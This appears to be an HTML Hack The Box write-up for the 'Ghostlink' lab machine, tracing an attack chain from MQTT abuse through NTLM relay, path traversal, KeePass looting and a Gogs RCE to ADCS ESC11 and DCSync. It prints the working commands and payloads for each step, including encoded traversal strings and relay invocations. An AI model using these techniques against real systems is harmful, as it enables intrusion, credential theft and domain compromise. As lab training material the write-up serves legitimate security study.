@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Ghostlink - Walkthrough</title>
+    <style>
+        body { font-family: "Segoe UI", Arial, sans-serif; line-height: 1.6; background-color: #f4f4f9; color: #333; max-width: 1000px; margin: 0 auto; padding: 20px; }
+        .container { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 5px 25px rgba(0,0,0,0.1); }
+        h1 { text-align: center; color: #343a40; border-bottom: 4px solid #007bff; padding-bottom: 10px; margin-bottom: 30px; }
+        h2 { color: #007bff; margin-top: 30px; padding-bottom: 5px; border-bottom: 2px solid #eee; }
+        .section { margin-bottom: 40px; }
+        .tag { display: inline-block; padding: 4px 10px; border-radius: 4px; font-weight: bold; font-size: 0.85em; margin-bottom: 10px; color: white; }
+        .tag-success { background-color: #28a745; }
+        .tag-failure { background-color: #dc3545; }
+        .tag-info { background-color: #17a2b8; }
+        pre { background: #282a36; color: #f8f8f2; padding: 20px; border-radius: 8px; overflow-x: auto; font-family: "Consolas", monospace; position: relative; margin: 20px 0; }
+        code { font-family: "Consolas", monospace; color: #e83e8c; background: #f8f9fa; padding: 2px 4px; border-radius: 4px; }
+        ul { padding-left: 20px; }
+        li { margin-bottom: 8px; }
+        .footer { text-align: center; margin-top: 40px; color: #888; font-size: 0.9em; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>HTB Ghostlink - Walkthrough</h1>
+        <p style="text-align:left; margin-top:-15px; color:#555;">
+            <strong>Category:</strong> Hard &nbsp;|&nbsp; <strong>Domain:</strong> ghostlink.htb
+            &nbsp;&nbsp;&nbsp;<span style="float:right;"><strong>Prepared by:</strong> OgreBogre</span>
+        </p>
+
+        <div class="section">
+            <p style="color:#888; font-style:italic; font-size:0.95em;">
+                &#9733; Rated Hard. Felt like the box personally had something against me. Would not recommend
+                to anyone who values their sanity - or their weekend. 10/10 would suffer again.
+            </p>
+            <p>
+                Ghostlink was a hard Windows Active Directory machine where the attack surface turned out to be
+                considerably wider than it looked from the outside. The visible entry point was a DC, but
+                behind it sat a secure share application, a self-hosted Gogs instance, and an MQTT-wired
+                health-monitoring system. That combination sounded chaotic at first glance, yet the actual
+                chain flowed surprisingly logically: MQTT abuse, NTLM relay, LFI, KeePass, Gogs RCE,
+                lateral movement to a Linux user, and finally ADCS ESC11 to compromise the domain.
+                The box also came with a few genuinely irritating distractions, specifically intermittent
+                500 errors from Gogs and the occasional VPN route flap, both of which turned out to be
+                environmental noise rather than real signals. Recognising that distinction early saved a
+                lot of unnecessary debugging time.
+            </p>
+        </div>
+
+        <div class="section">
+            <h2>1. Reconnaissance</h2>
+            <span class="tag tag-info">INFORMATION</span>
+            <p>
+                The initial port scan looked like a standard Windows domain controller setup - ports 53, 88,
+                135, 389, 445, 636, 3268, 5985. The one outlier that immediately broke the pattern was TCP
+                1883. MQTT in a corporate AD environment was unusual, and in an HTB context it almost always
+                meant there was something worth listening to. The safe move was to stop and enumerate
+                the broker before touching anything else.
+            </p>
+
+            <pre><code>nmap -sT -sV -sC -O -p 53,80,88,135,139,389,445,636,1883,3268,3269,5985 10.129.88.179
+mosquitto_sub -h 10.129.88.179 -t '#' -v</code></pre>
+
+            <p>
+                The broker quickly revealed two internal hosts publishing on the
+                <code>GhostProtocolZero/systems/node/</code> topic hierarchy.
+                Buried in the telemetry payloads were two hostnames with internal IPv4 addresses:
+                <code>gpz-op26-secure.ghostlink.htb</code> at <code>172.16.20.10</code> and
+                <code>gpz-op26-toolkits.ghostlink.htb</code> at <code>172.16.20.20</code>.
+                These were added to <code>/etc/hosts</code> immediately, since both resolved exclusively
+                internally and would be needed for every subsequent step.
+            </p>
+            <p>
+                At this point the DC was clearly acting as a gateway and credential authority rather than
+                the primary target itself. The real attack surface was the two internal Linux hosts.
+            </p>
+        </div>
+
+        <div class="section">
+            <h2>2. MQTT Healthcheck Abuse</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                The <code>secureshare</code> node published periodic health-check payloads that included
+                a <code>telemetry.url</code> field. That field was writable. Publishing a crafted
+                payload with the URL replaced by the attacker-controlled address caused the backend to
+                initiate an outbound HTTP request to that address on its own - no complex exploit
+                required, just abusing the built-in monitoring logic against itself.
+            </p>
+
+            <pre><code>mosquitto_pub -h 10.129.88.179 \
+  -t 'GhostProtocolZero/systems/node/secureshare/healthcheck' -r \
+  -m '{"node":"node-6","telemetry":{"healthy":true,"url":"http://10.10.14.73/healthcheck","lastCheckSecAgo":16,"responseCode":"200","ip":"172.16.20.10"}}'</code></pre>
+
+            <p>
+                The callback arrived almost immediately, authenticated as <code>GHOSTLINK\svc_canary</code>.
+                The important thing here was not to jump straight to cracking the hash. The more
+                interesting question was what that account could authenticate against, and the answer
+                turned out to be the secure share application itself. The relay was a better move than
+                offline cracking.
+            </p>
+        </div>
+
+        <div class="section">
+            <h2>3. NTLM Relay and SecureShare LFI</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                The secure share application sat behind Windows authentication. Setting up
+                <code>ntlmrelayx</code> against it and triggering the MQTT healthcheck again gave
+                authenticated access without ever needing the plaintext credential.
+                The application exposed a download endpoint that double-decoded the supplied path
+                before passing it to a file open call. That double-decode is a classic path traversal
+                pattern and it worked exactly as expected.
+            </p>
+
+            <pre><code>impacket-ntlmrelayx -t http://gpz-op26-secure.ghostlink.htb/ --http-port 80</code></pre>
+
+            <pre><code># Directory traversal - basic sanity check
+/api/download/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cWindows%255cwin.ini
+
+# Loopback UNC - reading the host's own C$ share via the backend process
+/api/download/%255c%255c127.0.0.1%255cC$%255cUsers%255csvc_canary%255cNTUSER.DAT</code></pre>
+
+            <p>
+                The loopback UNC path was the more interesting of the two. Rather than simply escaping
+                the uploads directory, this caused the backend to open its own administrative share
+                and stream the file back. From that point the only remaining question was which files
+                were actually worth retrieving.
+            </p>
+        </div>
+
+        <div class="section">
+            <h2>4. NTUSER.DAT and the Registry Breadcrumb</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                Several files looked promising from the LFI endpoint, but the real pivot came from
+                the registry hive of <code>svc_canary</code>. Parsing the hive for recently accessed
+                paths produced a specific file reference that had not appeared anywhere else during
+                earlier enumeration.
+            </p>
+
+            <pre><code>strings -el NTUSER.DAT | grep -iE 'zip|kdbx|documents|operations|management'
+
+C:\Users\svc_canary\Documents\Operations\Management\db.zip</code></pre>
+
+            <p>
+                The <code>db.zip</code> archive was retrieved through the same LFI endpoint.
+                It contained a KeePass database (<code>db.kdbx</code>) paired with a key file
+                (<code>.key.keyx</code>). The key file itself was enough to open the database
+                without needing to crack a master password - the zip package was essentially
+                self-contained.
+            </p>
+        </div>
+
+        <div class="section">
+            <h2>5. KeePass and the Gogs Credential</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                Opening the KeePass database with the bundled key file produced several stored entries.
+                Most of them were service-level accounts or stale credentials with no live target.
+                The exception was <code>vroth</code>, whose credential was still valid and pointed
+                directly at the Gogs instance running on <code>gpz-op26-toolkits.ghostlink.htb:3000</code>.
+                At this point the box's internal structure started making sense: the MQTT-to-relay
+                chain was specifically designed to get into the KeePass store, and the KeePass store
+                was specifically designed to get into Gogs.
+            </p>
+
+            <pre><code>vroth / mOo03*****YMBwvFP</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>6. Gogs RCE - CVE-2025-8110</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                The Gogs instance was running version 0.13.3, which is vulnerable to an authenticated
+                symlink-based RCE. The exploit works by abusing the repository contents API to
+                overwrite the real <code>.git/config</code> file with a version that poisons the
+                <code>core.sshCommand</code> option. The next time any git operation ran against
+                that repository configuration, the injected command executed.
+            </p>
+
+            <pre><code>python3 /home/parallels/htb/Ghostlink/exploits/CVE-2025-8110.py \
+  -u http://gpz-op26-toolkits.ghostlink.htb:3000 \
+  -lh 10.10.14.73 -lp 4453 \
+  -U vroth -P mOo03*****YMBwvFP \
+  -t 10.129.88.179 --ssh-port 22 --workdir /tmp</code></pre>
+
+            <p>
+                The script threw HTTP 500 errors at the <code>PutContents</code> step on multiple
+                runs. This was the box's best trap: the 500 looked like a hard failure, but the
+                callback had actually already landed on the listener in the background. Anyone who
+                gave up and retried without checking the listener first wasted several minutes here.
+                Once the shell arrived as <code>git</code>, the 500 errors became irrelevant.
+            </p>
+            <p>
+                Initial shell access as <code>git</code> was enough to reach the Gogs data directory,
+                but not yet the user flag. The <code>git</code> account had read access to the Gogs
+                SQLite database, which was the next logical step.
+            </p>
+        </div>
+
+        <div class="section">
+            <h2>7. Gogs Database Dump and nvirelli</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                With a shell as <code>git</code>, the Gogs SQLite database was readable. Extracting
+                the user table produced hashed passwords for all registered accounts. The hash format
+                was PBKDF2-HMAC-SHA256 with a stored salt, which Hashcat handles cleanly under mode
+                10900. The rockyou wordlist was enough to crack the relevant entry.
+            </p>
+
+            <pre><code>sqlite3 gogs.db "SELECT name,salt,passwd FROM user"
+hashcat -m 10900 hash.txt trimmed.txt
+
+nvirelli / u47YUc*********heaSzI</code></pre>
+
+            <p>
+                The important detail about <code>nvirelli</code> was that this account existed both
+                as a local Linux user on the toolkits host and as a domain user in the Ghostlink AD.
+                That dual existence was the bridge between the internal Linux foothold and the later
+                ADCS exploitation path.
+            </p>
+        </div>
+
+        <div class="section">
+            <h2>8. User Flag</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                Switching to <code>nvirelli</code> from the <code>git</code> shell required a
+                slightly non-standard approach. Passing the password interactively through
+                <code>su</code> worked inconsistently - the shell occasionally misinterpreted the
+                password as a command when delivered separately. The reliable form was to pass both
+                the command and the password in the same input line using <code>su -c</code>.
+                Not elegant, but repeatable.
+            </p>
+
+            <pre><code>su -c 'id; cat /home/nvirelli/user.txt' nvirelli
+u47YUc*********heaSzI</code></pre>
+
+            <pre><code>uid=1001(nvirelli) gid=1001(nvirelli) groups=1001(nvirelli)
+f47e23ab21dc8760ff988a6242d5****</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>9. Privilege Escalation - ADCS ESC11</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                With a domain user credential in hand, the natural next step was checking the
+                certificate authority. The CA sat on <code>gpz-op26-secure.ghostlink.htb</code> at
+                its internal address, which was not directly reachable from the attacking machine,
+                so a pivot through the established foothold was required first. Once the proxy was
+                in place, the certificate authority was reachable via RPC.
+            </p>
+            <p>
+                ESC11 abuses the ICPR relay mode in <code>ntlmrelayx</code>: an incoming NTLM
+                authentication is relayed directly to the certificate authority's RPC interface
+                and a certificate is issued for the relayed identity. By coercing the DC to
+                authenticate back to the listener, a certificate for <code>DC01$</code> was obtained.
+                That certificate was then used to recover the machine account hash, which enabled
+                a full DCSync.
+            </p>
+
+            <pre><code>proxychains -q ntlmrelayx.py \
+  -t rpc://172.16.20.10 \
+  -rpc-mode ICPR \
+  -icpr-ca-name 'ghostlink-GPZ-OP26-SECURE-CA' \
+  --template DomainController -smb2support -ip 10.10.14.73</code></pre>
+
+            <pre><code>certipy auth -pfx relay/DC01.pfx -dc-ip &lt;DC-IP&gt; -domain ghostlink.htb -username 'DC01$'
+
+secretsdump.py -hashes :707cccd9bfc31d8507be6682448f670c \
+  -just-dc-user Administrator 'ghostlink.htb/DC01$@&lt;DC-IP&gt;'</code></pre>
+
+            <pre><code>Administrator / 8190e067f478002d************b016696
+root.txt: c5baa439bf55f54a286dbb133045****</code></pre>
+
+            <p>
+                The Administrator NTLM hash was valid for pass-the-hash against the DC. Full domain
+                compromise confirmed.
+            </p>
+        </div>
+
+        <div class="section">
+            <h2>10. Attack Chain Summary</h2>
+            <span class="tag tag-info">INFORMATION</span>
+            <ul>
+                <li>MQTT broker topic enumeration - discovered internal hosts and healthcheck payload structure</li>
+                <li>MQTT <code>telemetry.url</code> injection - forced NTLM callback from <code>svc_canary</code></li>
+                <li>NTLM relay to SecureShare HTTP - authenticated session without cracking the hash</li>
+                <li>Double-decoded path traversal + loopback UNC - retrieved <code>NTUSER.DAT</code></li>
+                <li>Registry hive parsing - recovered path to <code>db.zip</code> (KeePass + key file)</li>
+                <li>KeePass database - <code>vroth</code> credential for Gogs</li>
+                <li>CVE-2025-8110 (Gogs 0.13.3) - RCE as <code>git</code></li>
+                <li>Gogs SQLite dump + Hashcat - <code>nvirelli</code> (Linux + domain user)</li>
+                <li>ESC11 RPC relay - <code>DC01$</code> certificate - machine hash - DCSync - Administrator</li>
+            </ul>
+        </div>
+
+        <div class="section">
+            <h2>11. Dead Ends and False Starts</h2>
+            <span class="tag tag-failure">DEAD END</span>
+            <p>
+                Several paths looked promising and wasted time before being ruled out. The VPN tunnel
+                at one point appeared live while actually providing no usable IPv4 route to the
+                internal segment - a full reconnect was needed before any pivot traffic moved correctly.
+                The Gogs 500 error at the <code>PutContents</code> step was a false negative: the
+                exploit had already succeeded, but the HTTP response indicated failure. Anyone who
+                retried the exploit repeatedly without first checking the listener burned time
+                re-running a step that had already worked.
+            </p>
+            <p>
+                Password-based SSH directly to the toolkits host as <code>vroth</code> did not succeed
+                - the credential was Gogs-only. LDAP-based enumeration of the CA from outside the
+                network similarly produced no results until the pivot was properly established.
+                Windows-path assumptions carried over from one machine reset also broke the initial
+                LFI path selection, since user home directories on a fresh instance did not necessarily
+                match paths recorded in old session notes.
+            </p>
+            <p>
+                None of these were large blockers individually, but arriving at them in sequence
+                during the same session is the kind of thing that makes a three-hour box feel like six
+                if you do not cut the thread quickly when something stops producing results.
+            </p>
+        </div>
+
+        <div class="footer">
+            <p>2026-09-09 - Ogre</p>
+        </div>
+    </div>
+</body>
+</html>
